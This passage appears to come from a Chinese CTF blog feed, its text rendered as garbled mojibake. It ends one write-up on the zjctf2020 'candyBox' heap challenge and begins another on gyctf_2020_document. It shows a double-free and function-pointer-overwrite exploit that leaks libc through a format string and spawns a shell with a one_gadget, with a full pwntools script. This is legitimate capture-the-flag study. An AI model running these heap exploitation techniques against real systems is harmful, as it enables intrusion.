´ï¼Œè°ƒè¯•èµ·æ¥å°±æ›´æ–¹ä¾¿äº†ï¼Œæˆ‘çš„æœºå­é‡å¯ä¹‹åè¿™ä¸ªé»˜è®¤å˜å›2çš„å¥½åƒã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å…ˆç”¨double freeçš„æ–¹å¼å°†å †å—ç”³è¯·åˆ°ä¼ªé€ çš„åŒºåŸŸé€ æˆå †é‡å è¦†ç›–æŒ‡é’ˆåŒºåŸŸä¸ºprintfï¼Œè‡³äºä¸ºä»€ä¹ˆprintfå‘¢ï¼Œé‚£æ˜¯å› ä¸ºå¯ä»¥ç”¨%pæ³„éœ²æ ˆæˆ–å¯„å­˜å™¨ä¸Šçš„å˜é‡ï¼Œæ ˆä¸Šé¢æˆ–å¤šæˆ–å°‘éƒ½ä¼šæœ‰libcçš„åœ°å€å­˜åœ¨çš„ã€‚</p><p>é‚£æˆ‘ä»¬å…ˆæ·»åŠ äº”ç»„å †å—</p><p>ç¬¬ä¸€ä¸ªå †å—ï¼šbig ï¼Œåœ¨æ•°æ®åŒºåŸŸä¼ªé€ å‡ºä¸€ä¸ª0x31å¤§å°çš„å †å—ä¸€éç­‰ä¼šç”³è¯·ã€‚</p><p>ç¬¬äºŒä¸ªå †å—ï¼šbigï¼ŒæŠŠå®ƒçš„sizeåŒºåŸŸå˜æˆ0x31ä»¥ä¾¿ç­‰ä¼šç”³è¯·ã€‚</p><p>ç¬¬ä¸‰ä¸ªå †å—ï¼šsmallï¼Œç”¨äºdouble free çš„å †å—</p><p>ç¬¬å››ä¸ªå †å—ï¼šsmallï¼Œç”¨äºdouble free çš„å †å—</p><p>ç¬¬äº”ä¸ªå †å—ï¼šsmallï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#äº¤äº’å‡½æ•°ä¼šåœ¨æœ€åå®Œæ•´çš„expä¸­ç»™å‡º</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x31\0&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å †å¸ƒå±€æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/1.png" alt="1"></p><p>ç®­å¤´æ‰€æŒ‡çš„ä¸¤ä¸ªåœ°æ–¹å°±æ˜¯è¦ä¼ªé€ å †å—çš„åŒºåŸŸã€‚</p><p>ç„¶åfreeæ‰ç¬¬ä¸‰ä¸ªç¬¬å››ä¸ªç¬¬ä¸‰ä¸ªçš„é¡ºåºè®©binä¸­å­˜åœ¨ä¸¤ä¸ªç›¸åŒçš„å †å—ï¼Œaddç¬¬ä¸€ä¸ªå †å—çš„æ—¶å€™æœ«å°¾å› ä¸ºæœ‰å…¶å®ƒå †å—çš„åœ°å€ï¼Œå› æ­¤ç›´æ¥æ”¹æœ€åä¸€ä½å³å¯ä»¥æŠŠfdæ”¹æˆåˆšåˆšç¬¬äºŒä¸ªå †ä¼ªé€ çš„sizeåŒºåŸŸï¼Œç­‰ä¼šç”³è¯·åˆ°è¿™é‡Œçš„å †å—ä¹‹åå°±å¯ä»¥ç›´æ¥ä¿®æ”¹æœ«å°¾çš„æŒ‡é’ˆæŠŠè¿™ä¸ªfree bigå‡½æ•°æ”¹æˆprintfå‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(p32(<span class="number">0x9a0</span>))<span class="comment">#6</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å †å¸ƒå±€å¦‚ä¸‹æ‰€ç¤º</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/2.png" alt="2"></p><p>ç”±äºæ”¹å˜äº†å †ç»“æ„å¯¼è‡´æŒ‡ä»¤æ— æ³•è¯†åˆ«åˆ°å †å—äº†ï¼Œä½†é‚£äº›ä¸é‡è¦ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é‚£ä¸ªåŸæœ¬å­˜free bigçš„å‡½æ•°å·²ç»å˜æˆäº†printfå‡½æ•°çš„åç§»(0x9a0)ã€‚</p><p>æ”¹å®Œä¹‹åå‘¢ï¼Œä¾æ—§æ˜¯ç”¨ç¬¬ä¸‰ä¸ªå †å—å’Œç¬¬å››ä¸ªå †å—double freeï¼Œç„¶åæŠŠå †å—ç”³è¯·åˆ°ç¬¬ä¸€ä¸ªä¼ªé€ çš„é‚£ä¸ªåœ°æ–¹ã€‚ç„¶åfreeç¬¬ä¸€ä¸ªå †å—ï¼Œè€Œæˆ‘ä»¬è¿™ä¸€æ¬¡ç”³è¯·å°±åœ¨ä¸Šé¢å¡«ä¸Šç±»ä¼¼%pä¹‹ç±»çš„å­—ç¬¦ï¼Œä¸ºä»€ä¹ˆèƒ½æˆåŠŸå‘¢ï¼Ÿä»”ç»†çœ‹å®ƒdeleteä¸€ä¸ªå †å—çš„æ“ä½œï¼Œæ˜¯ä»¥å †å—çš„åœ°å€ä½œä¸ºå‚æ•°çš„è€Œä¸æ˜¯ä»¥å †å—çš„å†…å®¹ä½œä¸ºå‚æ•°ã€‚æ‰€ä»¥å¦‚æœä¸Šé¢æ”¾ä¸Š%pä¹‹ç±»çš„å­—ç¬¦ä¸²ï¼Œdelete ä¹‹åå°±ä¼šprintfè¿™å †å—ä¸Šçš„å†…å®¹ï¼Œè¯†åˆ«åˆ°%pä¹‹ç±»çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å°±ä¼šå¯¹åº”æ³„éœ²å‡ºä¸€äº›åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;%4$p&#x27;</span>+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>åšå®Œè¿™äº›æ“ä½œä¹‹åå¯ä»¥çœ‹åˆ°ä¸€ä¸‹å †å—çš„å¸ƒå±€ã€‚</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/3.png" alt="3"></p><p>free 1ä¹‹åå¯ä»¥æ³„éœ²å‡ºä¸€ä¸ªç±»ä¼¼libcçš„åœ°å€ã€‚</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/4.png" alt="4"></p><p>å› ä¸ºè¿™å±äºæ— å·®åˆ«æ³„éœ²ï¼Œå°±æ˜¯è¯´ä½ å…¶å®ä¹Ÿä¸çŸ¥é“è¿™ä¸ªæ³„éœ²çš„æ˜¯ä¸ªä»€ä¹ˆé¬¼ä¸œè¥¿ï¼Œé‚£ä½ å°±ç›´æ¥vmmapæŸ¥çœ‹libcçš„codeæ®µåŠ è½½åœ°å€åœ¨å“ªé‡Œï¼Œå†æŠŠè¿™ä¸ªæ•°å’ŒåŸºå€ä¸€å‡ï¼Œå¾—åˆ°ä¸€ä¸ªåç§»ï¼Œé‚£ä¹ˆæ¥å—åˆ°è¿™ä¸ªæ•°å€¼ä¹‹åå‡å»é‚£ä¸ªåç§»å°±èƒ½å›ºå®šæ³„éœ²å‡ºlibcçš„åŸºå€äº†ã€‚</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/5.png" alt="5"></p><p>è™½ç„¶æ³„éœ²å‡ºæ¥çš„åœ°å€å±äºld.soä¸­çš„åœ°å€ï¼Œä½†æ˜¯ç”±äºlibcå’Œld.soæ˜¯ç´§æŒ¨ç€çš„ï¼Œä¸å¦¨ç¢èƒ½é€šè¿‡å®ƒæ³„éœ²å‡ºlibcçš„åœ°å€ï¼Œæœ€åè®¡ç®—å¾—åˆ°åç§»0x5ed700ã€‚åˆ°è¿™é‡Œæ³„éœ²libcçš„å·¥ä½œå°±ç®—å®Œæˆå•¦ã€‚</p><h2 id="åŠ«æŒç¨‹åºæµ"><a href="#åŠ«æŒç¨‹åºæµ" class="headerlink" title="åŠ«æŒç¨‹åºæµ"></a>åŠ«æŒç¨‹åºæµ</h2><p>è¿™é‡Œè¿˜æ˜¯é å‡½æ•°æŒ‡é’ˆï¼Œæ—¢ç„¶libcåœ°å€å·²ç»æ³„éœ²å¾—åˆ°äº†ï¼Œé‚£ä¹ˆå¯ä»¥æ•…æŠ€é‡æ–½ï¼Œå†æŠŠå‡½æ•°æŒ‡é’ˆæ”¹æˆsystemï¼Œç„¶åå‚æ•°ç»™/bin/shï¼Œdeleteä¹‹åç›´æ¥getshellï¼Œéå¸¸ç¨³ï¼Œå½“ç„¶è¿™é‡Œæˆ‘å·æ‡’äº†ï¼Œæˆ‘ç›´æ¥æ¢æˆonegadgetçš„åœ°å€äº†ï¼Œå› ä¸ºåæœŸè€ƒè™‘åˆ°å †å—æ•°é‡å¯èƒ½ä¸å¤Ÿï¼Œå®ƒå †å—æŒ‡é’ˆçš„åˆ†é…æœºåˆ¶æ˜¯è¿™æ ·çš„ï¼š</p><p>å»ºç«‹ä¸€ä¸ªæ•°ç»„aï¼Œåˆå§‹éƒ½ä¸º0ï¼Œæ¯æ¬¡addï¼Œä¼šæŠŠè¿™ä¸ªæ•°ç»„ç½®ä¸º1ï¼ŒfreeæŠŠå¯¹åº”è¿™ä¸ªä¸‹æ ‡ç½®ä¸º0ã€‚addåªä¼šè€ƒè™‘è¯¥æ•°ç»„è¿™ä¸ªä¸‹æ ‡çš„å€¼ä¸º0çš„æ—¶å€™æ‰ä¼šåˆ†é…å¯¹åº”åç§»çš„æŒ‡é’ˆç»™å½“å‰addçš„å †å—ã€‚ä½†æ˜¯ç”±äºä¹‹å‰æˆ‘ä»¬ç”¨è¿‡äº†å¾ˆå¤šdouble freeï¼Œå› ä¸ºæœ‰ä¸¤æ¬¡freeæ˜¯å¯¹åŒä¸€ä¸ªå †å—æ“ä½œï¼Œé‚£ä¸ªæ•°ç»„è™½ç„¶ä¼šå˜æˆ0ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸¤æ¬¡æ˜¯å¯¹åŒä¸€ä¸ªå…ƒç´ æ“ä½œäº†ï¼Œæˆ‘ä»¬æ•´æ•´åˆæ˜¯æ‹¿å‡ºæ¥äº†ä¸‰ä¸ªå †å—ï¼Œæ‰€ä»¥æ¯æ¬¡double freeå¯ç”¨çš„æ•°ç»„æŒ‡é’ˆæ°¸ä¹…å°‘1ï¼Œå¹¶ä¸”ç”±äºä¹‹å‰é‚£äº›æ“ä½œï¼Œå¯ä»¥åˆ©ç”¨çš„å †å¯ä»¥è¯´ä»¥æˆ‘ç›®å‰çš„èƒ½åŠ›æˆ‘æ˜¯æƒ³æ”¾å¼ƒé‚£äº›å †å—é‡æ–°å¼€å§‹çš„ã€‚å› æ­¤å†æ¬¡çš„double free åªéœ€è¦åŠ«æŒä¸€ä¸ªå‡½æ•°æŒ‡é’ˆä¸ºonegadgetå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x31</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿå¾ˆå¹¸è¿ï¼Œè¯•åˆ°ç¬¬ä¸‰ä¸ªonegadgetå°±æˆåŠŸäº†ã€‚å¦‚æœä¸è¡Œåº”è¯¥æ¢æˆsystemç„¶åä¹‹å‰å†åŒæ ·çš„æ–¹å¼å¼„å‡ºæ¥/bin/shå­—ç¬¦ä¸²å°±è¡Œï¼Œä½†æ˜¯æˆ‘ä¸ç¡®å®šå †å—æ•°é‡èƒ½ä¸èƒ½å¤Ÿç”¨ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;2.Remove a candy:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10000</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Taste: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;2.Remove a candy:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./candyBox&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x31\0&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(p32(<span class="number">0x9a0</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;%4$p&#x27;</span>+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x5ed700</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sys=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;malloc_hook:&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x31</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯æˆåŠŸgetshellçš„æˆªå›¾ï¼Œæœ€åå†™å‡ºæ¥éœ€è¦çˆ†ç ´çš„å°±æ˜¯printfé‚£åŠä¸ªå­—èŠ‚ï¼Œè·‘åˆ°è¿œç¨‹ç¯å¢ƒæ³¨æ„ä¸€ä¸‹åº”è¯¥é—®é¢˜ä¸å¤§ã€‚</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/6.png" alt="6"></p><h2 id="æœ€åçš„è¯"><a href="#æœ€åçš„è¯" class="headerlink" title="æœ€åçš„è¯"></a>æœ€åçš„è¯</h2><p>æœ¬é¢˜ç›®æ¥æºäºzjctf2020å†³èµ›çš„pwn2ï¼Œæ®è¯´é‚£é¢˜ä¹Ÿæ²¡å¤šå°‘äººåšå‡ºæ¥ï¼Œè€Œæˆ‘è™½ç„¶èƒ½è‡ªå·±ç‹¬ç«‹åšå‡ºæ¥ï¼Œä½†æ˜¯æ•´æ•´èŠ±äº†9ä¸ªå°æ—¶ï¼Œå¬è¯´å»å¹´å†³èµ›æ€»å…±ä¹Ÿå°±8ä¸ªå°æ—¶qwqã€‚</p><p>è¿™çœŸçš„æ˜¯æˆ‘åšè¿‡çš„æœ€éš¾çš„uafæ¼æ´çš„é¢˜ç›®äº†ï¼Œæˆ‘åŸæœ¬ä»¥ä¸ºå®ƒåº”è¯¥å°±è·Ÿé‚£ç§æ²¡æœ‰ä»»ä½•ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤çš„sqlæ³¨å…¥å·®ä¸å¤šï¼Œæ²¡æƒ³åˆ°å®ƒåˆ°å¤„åŠ é™åˆ¶å¯¼è‡´å¾ˆå¤šæ¼æ´å¾ˆéš¾åˆ©ç”¨ï¼Œä¹Ÿç®—æ˜¯ç»™æˆ‘å±•ç¤ºäº†ä¸€æ³¢å§ï¼Œå¸Œæœ›è¿™æ¬¡çš„çœèµ›èƒ½è®©æˆ‘å‡ºä¸€é“pwnå§ï¼ŒåŠ æ²¹å†²å†²å†²ï¼</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gyctf_2020_document write up</title>
      <link href="/2021/10/26/gyctf_2020_document/"/>
      <url>/2021/10/26/gyctf_2020_document/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©æ¥åº·åº·è¿™é“é¢˜<a href="https://buuoj.cn/challenges#gyctf_2020_document">gyctf_2020_document</a></p><span id="more"></span><h2 id="é™æ€åˆ†æç¡®å®šæ¼æ´ç±»å‹"><a href="#é™æ€åˆ†æç¡®å®šæ¼æ´ç±»å‹" class="headerlink" title="é™æ€åˆ†æç¡®å®šæ¼æ´ç±»å‹"></a>é™æ€åˆ†æç¡®å®šæ¼æ´ç±»å‹</h2><p>ç»å…¸çš„å †èœå•é¢˜ï¼Œä¿æŠ¤å…¨å¼€ï¼Œ2.23çš„libcã€‚ä¿æŠ¤å…¨å¼€æ„å‘³ç€gotè¡¨åŠ«æŒä¸äº†ã€‚å¢åˆ æ”¹æŸ¥å››æ ·åŠ¨ä½œéƒ½æœ‰ï¼Œå¹¶ä¸”æ²¡æœ‰é‚£ç§è™šæ™ƒä¸€æª(ä¾‹å¦‚showå‡½æ•°ç›´æ¥ç»™ä½ putsä¸€ä¸ªtoo young too simpleä¹‹ç±»çš„)çš„å‡½æ•°ã€‚</p><p>å…ˆçœ‹addå‡½æ•°ï¼Œmallocäº†ä¸¤ä¸ªå †å—ï¼Œéƒ½æ˜¯å›ºå®šå¤§å°ï¼Œä¸€ä¸ªå †å—æ˜¯0x20å¤§å°ï¼Œå¦ä¸€ä¸ªæ˜¯0x90å¤§å°ã€‚ç„¶åç¬¬äºŒä¸ªå †å—çš„æŒ‡é’ˆå­˜åœ¨äº†ç¬¬ä¸€ä¸ªå †å—ä¸Šé¢ã€‚ç¬¬ä¸€ä¸ªå †å—åå…«ä¸ªå­—èŠ‚ç”¨æ¥å­˜äº†æ€§åˆ«ï¼Œæ€§åˆ«è¦ä¹ˆ1è¦ä¹ˆ16ï¼Œæ˜¯é€šè¿‡åˆ¤æ–­ä½ è¾“å…¥çš„æ˜¯å¦ä¸ºWæ¥å†³å®šçš„ã€‚ä¹‹åå°±æ˜¯é‚£ä¸ª0x90çš„å¤§å †å—ä¸Šé¢å­˜ä¸€ä¸ªåå­—ï¼Œä¸­é—´é—´éš”ä¸€ä¸ªflagï¼Œç„¶åå †å—åç§»0x10çš„ä½ç½®ä¸Šé¢æ”¾ä¸Šä½ è¦è¾“å…¥çš„å†…å®¹ã€‚</p><p>çœ‹çœ‹deleteå‡½æ•°ï¼Œå­˜åœ¨æ˜æ˜¾ çš„UAFæ¼æ´ï¼Œå¯ä»¥æ“ä½œfreeçš„å †å—ã€‚å¹¶ä¸”åªfree 0x90çš„å †å—è€Œ0x20çš„å †å—ä¸ä¼šfreeã€‚é‚£ä¹ˆé€šè¿‡è¿™äº›åˆ†ææˆ‘ä»¬å°±å¯ä»¥å…ˆaddä¸¤ä¸ªå †å—ï¼Œfreeæ‰ç¬¬ä¸€ä¸ªä¹‹åshowç¬¬ä¸€ä¸ªå°±èƒ½æ³„éœ²å‡ºlibcçš„åœ°å€ã€‚</p><p>å…¶å®ƒçš„ä¸­è§„ä¸­çŸ©ï¼Œå”¯ç‹¬editå‡½æ•°æ­£å¸¸æƒ…å†µä¸‹å®ƒæ¯ä¸ªå †å—åªå…è®¸editä¸€æ¬¡ï¼Œä½†ä¹Ÿåªæ˜¯å› ä¸ºé‚£ä¸ª0x20å †å—çš„åé¢çš„é‚£ä¸ªflagåŸå› ã€‚</p><h2 id="æ³„éœ²libcåœ°å€"><a href="#æ³„éœ²libcåœ°å€" class="headerlink" title="æ³„éœ²libcåœ°å€"></a>æ³„éœ²libcåœ°å€</h2><p>è¿™é‡Œå»ºè®®ï¼Œnameå¼ºåˆ¶8ä½å°±ä¸è¦æƒ³è¿™ä¹ˆå¤šç›´æ¥ç»™<code>/bin/sh;</code>å°±å®Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;/bin/sh;&#x27;</span>,<span 